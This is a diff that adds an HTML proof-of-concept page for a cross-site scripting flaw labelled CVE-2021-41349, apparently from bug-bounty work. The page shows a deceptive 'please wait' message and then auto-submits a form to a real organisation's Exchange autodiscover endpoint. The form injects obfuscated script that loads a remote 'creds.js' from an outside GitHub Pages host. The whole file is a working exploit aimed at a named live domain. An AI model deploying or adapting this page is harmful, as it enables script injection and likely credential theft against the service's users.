@@ -1,0 +1,35 @@
+
+<html>
+    <head>
+        <title>XSS | CVE-2021-41349</title>
+    </head>
+    <body>
+        <div>
+            <h1>XSS | CVE-2021-41349</h1>
+            <p>You'll be redirected after <strong>3 Seconds</strong>, Please Wait ....</p>
+        </div>
+        <script>
+            function submit() {
+                var form = document.createElement("form");
+                form.method = "POST";
+                form.action = "https://mail.nintendo.fr/autodiscover/autodiscover.json";
+                form.enctype = "application/x-www-form-urlencoded"
+                var el = document.createElement("input");
+                el.name=  "<script>document.getElementsByTagName(String.fromCharCode(98,111,100,121))[0].appendChild(document.createElement(String.fromCharCode(115,99,114,105,112,116))).setAttribute(String.fromCharCode(115,114,99),String.fromCharCode(104,116,116,112,115,58,47,47,107,104,97,114,97,45,104,49,46,103,105,116,104,117,98,46,105,111,47,112,111,99,47,99,114,101,100,115,46,106,115));a";
+                el.value= '"<\/script>';
+                form.appendChild(el);
+
+                var el = document.createElement("input");
+                el.name=  "x"
+                el.value= "1";
+                form.appendChild(el);
+
+                document.body.appendChild(form);
+
+                form.submit();
+            }
+            // Pause 3 secs, Then Run
+            setTimeout(submit, 3000)
+        </script>
+    </body>
+</html>
